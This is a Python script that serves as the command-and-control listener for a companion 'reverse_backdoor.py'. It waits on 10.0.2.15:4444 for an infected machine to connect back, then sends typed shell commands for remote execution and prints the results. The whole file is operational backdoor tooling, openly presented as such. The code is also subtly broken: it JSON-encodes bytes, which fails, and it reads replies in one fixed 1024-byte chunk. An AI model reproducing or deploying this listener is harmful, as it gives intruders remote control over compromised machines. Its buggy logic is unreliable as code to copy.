#! /usr/bin/env python
# NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
# Compatibility: Python 3 only.

import json
import socket


class Listener:
    def __init__(self, ip_address, port):
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_socket.bind((ip_address, port))
        listener_socket.listen(0)
        print("[+] Waiting for incoming connection...")
        self.connection, address = listener_socket.accept()
        print(f"[+] Connection established! Source: {address}.")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode(errors="replace"))

    def reliable_receive(self):
        json_data = self.connection.recv(1024).decode(errors="replace")
        return json.loads(json_data)

    def execute_remotely(self, command):
        self.reliable_send(command.encode(errors="replace"))
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(" >> ")
            result = self.execute_remotely(command)
            print(result)


listener = Listener("10.0.2.15", 4444)
listener.run()
